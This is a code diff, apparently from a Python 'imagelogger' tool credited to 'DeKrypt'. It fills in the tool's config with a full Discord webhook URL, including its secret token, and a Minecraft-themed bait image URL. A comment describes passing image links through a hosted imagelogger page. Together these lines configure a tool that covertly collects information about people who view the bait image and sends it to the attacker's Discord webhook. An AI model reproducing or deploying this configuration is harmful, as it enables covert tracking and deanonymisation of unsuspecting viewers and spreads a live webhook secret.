@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1348695599049871480/FLgwkWB5mzNzHrn8GrOPygH3FGT8rTS8L7QwkPLazHVtZs9MnPJIjpaRitTVoY-OO_Tt",
+    "image": "https://media.discordapp.net/attachments/769298149407195139/1348695975618678804/how-to-scroll-click-on-minecraft.png?ex=67d06682&is=67cf1502&hm=088204e26131482ec6aae24b5fbaa69bbc51df79de224dc7e3d5c4f00d8e1a3f&=&format=webp&quality=lossless&width=1330&height=887", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
